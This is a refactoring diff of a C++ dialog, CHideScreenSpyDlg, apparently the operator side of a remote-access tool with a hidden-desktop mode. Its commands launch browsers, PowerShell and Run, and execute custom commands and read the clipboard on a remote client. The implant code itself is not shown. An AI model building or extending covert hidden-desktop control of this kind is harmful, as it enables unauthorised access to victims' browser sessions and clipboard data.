@@ -57,7 +57,7 @@ CHideScreenSpyDlg::CHideScreenSpyDlg(CWnd* pParent, Server* pIOCPServer, ClientC
 
 CHideScreenSpyDlg::~CHideScreenSpyDlg() {
 	m_bIsClosed = TRUE;
-	m_iocpServer->Disconnect(m_ContextObject);
+    m_ContextObject->GetServer()->Disconnect(m_ContextObject);
 	DestroyIcon(m_hIcon);
 	Sleep(200);
 	if (!m_aviFile.IsEmpty()) {
@@ -247,7 +247,7 @@ BOOL CHideScreenSpyDlg::OnInitDialog()
     m_hZoom = ((double)m_BitmapInfor_Full->bmiHeader.biHeight) / ((double)(m_CRect.bottom - m_CRect.top));
     SetStretchBltMode(m_hFullDC, STRETCH_HALFTONE);
     BYTE	bBuff = COMMAND_NEXT;
-    m_iocpServer->Send2Client(m_ContextObject, &bBuff, 1);
+    m_ContextObject->Send2Client(&bBuff, 1);
 #ifdef _DEBUG
     // ShowWindow(SW_MINIMIZE);
 #endif
@@ -447,7 +447,7 @@ void  CHideScreenSpyDlg::OnSysCommand(UINT nID, LPARAM lParam)
         return;
     case IDM_SET_FLUSH: {
         BYTE	bToken = COMMAND_FLUSH_HIDE;
-        m_iocpServer->Send2Client(m_ContextObject, &bToken, sizeof(bToken));
+        m_ContextObject->Send2Client(&bToken, sizeof(bToken));
     }
     break;
     case IDM_CONTROL: {
@@ -498,7 +498,7 @@ void  CHideScreenSpyDlg::OnSysCommand(UINT nID, LPARAM lParam)
     break;
     case IDM_GET_CLIPBOARD: { // 获取剪贴板
         BYTE	bToken = COMMAND_SCREEN_GET_CLIPBOARD;
-        m_iocpServer->Send2Client(m_ContextObject, &bToken, sizeof(bToken));
+        m_ContextObject->Send2Client(&bToken, sizeof(bToken));
     }
     break;
     case IDM_SET_CLIPBOARD: { // 设置剪贴板
@@ -507,24 +507,24 @@ void  CHideScreenSpyDlg::OnSysCommand(UINT nID, LPARAM lParam)
     break;
     case IDM_SETSCERRN: {
         BYTE	bToken = COMMAND_SCREEN_SETSCREEN_HIDE;
-        m_iocpServer->Send2Client(m_ContextObject, &bToken, sizeof(bToken));
+        m_ContextObject->Send2Client(&bToken, sizeof(bToken));
     }
     break;
     case IDM_QUALITY60: { // 清晰度60
         BYTE	bToken = COMMAND_COMMAND_SCREENUALITY60_HIDE;
-        m_iocpServer->Send2Client(m_ContextObject, &bToken, sizeof(bToken));
+        m_ContextObject->Send2Client(&bToken, sizeof(bToken));
         pSysMenu->CheckMenuRadioItem(IDM_QUALITY60, IDM_QUALITY100, IDM_QUALITY60, MF_BYCOMMAND);
     }
     break;
     case IDM_QUALITY85: { // 清晰度85
         BYTE	bToken = COMMAND_COMMAND_SCREENUALITY85_HIDE;
-        m_iocpServer->Send2Client(m_ContextObject, &bToken, sizeof(bToken));
+        m_ContextObject->Send2Client(&bToken, sizeof(bToken));
         pSysMenu->CheckMenuRadioItem(IDM_QUALITY60, IDM_QUALITY100, IDM_QUALITY85, MF_BYCOMMAND);
     }
     break;
     case IDM_QUALITY100: { // 清晰度100
         BYTE	bToken = COMMAND_COMMAND_SCREENUALITY100_HIDE;
-        m_iocpServer->Send2Client(m_ContextObject, &bToken, sizeof(bToken));
+        m_ContextObject->Send2Client(&bToken, sizeof(bToken));
         pSysMenu->CheckMenuRadioItem(IDM_QUALITY60, IDM_QUALITY100, IDM_QUALITY100, MF_BYCOMMAND);
     }
     break;
@@ -543,84 +543,84 @@ void  CHideScreenSpyDlg::OnSysCommand(UINT nID, LPARAM lParam)
         BYTE	bToken[2];
         bToken[0] = COMMAND_HIDE_USER;
         bToken[1] = IDM_OPEN_Explorer;
-        m_iocpServer->Send2Client(m_ContextObject, bToken, 2);
+        m_ContextObject->Send2Client(bToken, 2);
     }
     break;
     case 	IDM_OPEN_run: {
         BYTE	bToken[2];
         bToken[0] = COMMAND_HIDE_USER;
         bToken[1] = IDM_OPEN_run;
-        m_iocpServer->Send2Client(m_ContextObject, bToken, 2);
+        m_ContextObject->Send2Client(bToken, 2);
     }
     break;
     case 	IDM_OPEN_Powershell: {
         BYTE	bToken[2];
         bToken[0] = COMMAND_HIDE_USER;
         bToken[1] = IDM_OPEN_Powershell;
-        m_iocpServer->Send2Client(m_ContextObject, bToken, 2);
+        m_ContextObject->Send2Client(bToken, 2);
     }
     break;
     case	IDM_OPEN_Chrome: {
         BYTE	bToken[2];
         bToken[0] = COMMAND_HIDE_USER;
         bToken[1] = IDM_OPEN_Chrome;
-        m_iocpServer->Send2Client(m_ContextObject, bToken, 2);
+        m_ContextObject->Send2Client(bToken, 2);
     }
     break;
     case	IDM_OPEN_Edge: {
         BYTE	bToken[2];
         bToken[0] = COMMAND_HIDE_USER;
         bToken[1] = IDM_OPEN_Edge;
-        m_iocpServer->Send2Client(m_ContextObject, bToken, 2);
+        m_ContextObject->Send2Client(bToken, 2);
     }
     break;
     case	IDM_OPEN_Brave: {
         BYTE	bToken[2];
         bToken[0] = COMMAND_HIDE_USER;
         bToken[1] = IDM_OPEN_Brave;
-        m_iocpServer->Send2Client(m_ContextObject, bToken, 2);
+        m_ContextObject->Send2Client(bToken, 2);
     }
     break;
     case	IDM_OPEN_Firefox: {
         BYTE bToken[2];
         bToken[0] = COMMAND_HIDE_USER;
         bToken[1] = IDM_OPEN_Firefox;
-        m_iocpServer->Send2Client(m_ContextObject, bToken, 2);
+        m_ContextObject->Send2Client(bToken, 2);
     }
     break;
     case	IDM_OPEN_Iexplore: {
         BYTE	bToken[2];
         bToken[0] = COMMAND_HIDE_USER;
         bToken[1] = IDM_OPEN_Iexplore;
-        m_iocpServer->Send2Client(m_ContextObject, bToken, 2);
+        m_ContextObject->Send2Client(bToken, 2);
     }
     break;
     case IDM_OPEN_ADD_1: {
         BYTE	bToken[2];
         bToken[0] = COMMAND_HIDE_USER;
         bToken[1] = IDM_OPEN_ADD_1;
-        m_iocpServer->Send2Client(m_ContextObject, bToken, 2);
+        m_ContextObject->Send2Client(bToken, 2);
     }
     break;
     case 	IDM_OPEN_ADD_2: {
         BYTE	bToken[2];
         bToken[0] = COMMAND_HIDE_USER;
         bToken[1] = IDM_OPEN_ADD_2;
-        m_iocpServer->Send2Client(m_ContextObject, bToken, 2);
+        m_ContextObject->Send2Client(bToken, 2);
     }
     break;
     case 	IDM_OPEN_ADD_3: {
         BYTE	bToken[2];
         bToken[0] = COMMAND_HIDE_USER;
         bToken[1] = IDM_OPEN_ADD_3;
-        m_iocpServer->Send2Client(m_ContextObject, bToken, 2);
+        m_ContextObject->Send2Client(bToken, 2);
     }
     break;
     case 	IDM_OPEN_ADD_4: {
         BYTE	bToken[2];
         bToken[0] = COMMAND_HIDE_USER;
         bToken[1] = IDM_OPEN_ADD_4;
-        m_iocpServer->Send2Client(m_ContextObject, bToken, 2);
+        m_ContextObject->Send2Client(bToken, 2);
     }
     break;
     case	IDM_OPEN_zdy: {
@@ -635,7 +635,7 @@ void  CHideScreenSpyDlg::OnSysCommand(UINT nID, LPARAM lParam)
             lpPacket[0] = COMMAND_HIDE_USER;
             lpPacket[1] = IDM_OPEN_zdy;
             memcpy(lpPacket + 2, dlg.m_str.GetBuffer(0), nPacketLength - 2);
-            m_iocpServer->Send2Client(m_ContextObject, lpPacket, nPacketLength);
+            m_ContextObject->Send2Client(lpPacket, nPacketLength);
             delete[] lpPacket;
 
         }
@@ -661,7 +661,7 @@ void  CHideScreenSpyDlg::OnSysCommand(UINT nID, LPARAM lParam)
             lpPacket[0] = COMMAND_HIDE_USER;
             lpPacket[1] = IDM_OPEN_zdy2;
             memcpy(lpPacket + 2, &m_ZdyCmd, nPacketLength - 2);
-            m_iocpServer->Send2Client(m_ContextObject, lpPacket, nPacketLength);
+            m_ContextObject->Send2Client(lpPacket, nPacketLength);
             delete[] lpPacket;
         }
         EnableWindow(TRUE);
@@ -671,27 +671,27 @@ void  CHideScreenSpyDlg::OnSysCommand(UINT nID, LPARAM lParam)
         BYTE	bToken[2];
         bToken[0] = COMMAND_HIDE_USER;
         bToken[1] = IDM_OPEN_360JS;
-        m_iocpServer->Send2Client(m_ContextObject, bToken, 2);
+        m_ContextObject->Send2Client(bToken, 2);
         break;
     }
     case 	IDM_OPEN_360AQ: {
         BYTE	bToken[2];
         bToken[0] = COMMAND_HIDE_USER;
         bToken[1] = IDM_OPEN_360AQ;
-        m_iocpServer->Send2Client(m_ContextObject, bToken, 2);
+        m_ContextObject->Send2Client(bToken, 2);
     }
     break;
     case 	IDM_OPEN_360AQ2: {
         BYTE	bToken[2];
         bToken[0] = COMMAND_HIDE_USER;
         bToken[1] = IDM_OPEN_360AQ2;
-        m_iocpServer->Send2Client(m_ContextObject, bToken, 2);
+        m_ContextObject->Send2Client(bToken, 2);
         break;
     }
     case	IDM_OPEN_close: {
         LPBYTE	lpPacket = new BYTE;
         lpPacket[0] = COMMAND_HIDE_CLEAR;
-        m_iocpServer->Send2Client(m_ContextObject, lpPacket, 1);
+        m_ContextObject->Send2Client(lpPacket, 1);
         delete lpPacket;
     }
     break;
@@ -777,7 +777,7 @@ void CHideScreenSpyDlg::SendCommand(const MYMSG& pMsg)
     LPBYTE lpData = new BYTE[sizeof(MYMSG) + 1];
     lpData[0] = COMMAND_SCREEN_CONTROL;
     memcpy(lpData + 1, &pMsg, sizeof(MYMSG));
-    m_iocpServer->Send2Client(m_ContextObject, lpData, sizeof(MYMSG) + 1);
+    m_ContextObject->Send2Client(lpData, sizeof(MYMSG) + 1);
 
     SAFE_DELETE_ARRAY(lpData);
 }
@@ -816,7 +816,7 @@ void CHideScreenSpyDlg::SendServerClipboard()
     memcpy(lpData + 1, lpstr, nPacketLen - 1);
     ::GlobalUnlock(hglb);
     ::CloseClipboard();
-    m_iocpServer->Send2Client(m_ContextObject, lpData, nPacketLen);
+    m_ContextObject->Send2Client(lpData, nPacketLen);
     delete[] lpData;
 }
 
